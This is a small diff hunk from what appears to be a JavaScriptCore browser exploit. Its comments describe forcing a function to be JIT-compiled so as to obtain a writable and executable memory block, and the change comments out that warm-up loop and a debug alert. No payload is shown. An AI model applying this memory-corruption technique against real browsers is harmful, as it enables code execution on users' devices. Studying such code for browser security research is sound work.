@@ -188,8 +188,8 @@ function dgc() {
 	// Call the function 0x1000 times to force JavascriptCore to mark it as high-usage and JIT it.
 	// This will force JS to create a r/w/x block of memory, with raw machine code,
 	// this block can then be written to.
- 	for (var z = 0; z < 0x1000; z++) fc();
-	alert("After jitted code");
+ 	//for (var z = 0; z < 0x1000; z++) fc();
+	//alert("After jitted code");
 	 
 	 
  	for (i = 0; i < bufs.length; i++) {
